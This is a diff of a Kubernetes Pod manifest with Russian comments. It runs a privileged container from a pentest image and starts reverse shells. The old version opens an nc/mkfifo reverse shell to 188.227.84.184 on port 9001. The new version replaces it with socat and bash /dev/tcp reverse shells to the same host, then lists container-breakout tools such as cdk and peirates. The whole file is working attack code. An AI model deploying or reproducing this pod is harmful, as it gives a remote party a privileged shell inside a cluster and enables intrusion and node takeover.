@@ -1,24 +1,23 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: mtkpi-pentest-pod
-  namespace: default  # или твой namespace
+  name: mtkpi-pentest-pod-v2
 spec:
   containers:
   - name: mtkpi
-    image: r0binak/mtkpi:v1  # Полный пентест-образ
+    image: r0binak/mtkpi:v1
     securityContext:
-      privileged: true           # Оставляем — раз уже работает
-      capabilities:
-        add: ["ALL"]             # На всякий случай
+      privileged: true
     command: ["/bin/sh", "-c"]
     args:
     - |
-      # 1. Запускаем reverse shell (как у тебя)
-      rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 188.227.84.184 9001 > /tmp/f &
-      
-      # 2. Держим под живым (sleep infinity)
-      echo "[+] Reverse shell запущен на 188.227.84.184:9001"
-      echo "[+] MTKPI готов. Доступные инструменты:"
-      ls -la /tools 2>/dev/null || echo "Tools в /bin, /usr/local/bin"
+      # Вариант A: socat (надёжнее nc)
+      apk add --no-cache socat 2>/dev/null || true
+      socat TCP:188.227.84.184:9001 EXEC:"/bin/sh -i",pty,stderr,setsid,sigint,sane &
+
+      # Вариант B: bash /dev/tcp (если socat нет)
+      bash -i >& /dev/tcp/188.227.84.184/9001 0>&1 &
+
+      echo "[+] Reverse shell sent via socat + bash"
+      echo "[+] Tools: cdk eval, peirates, kubectl get nodes"
       sleep infinity
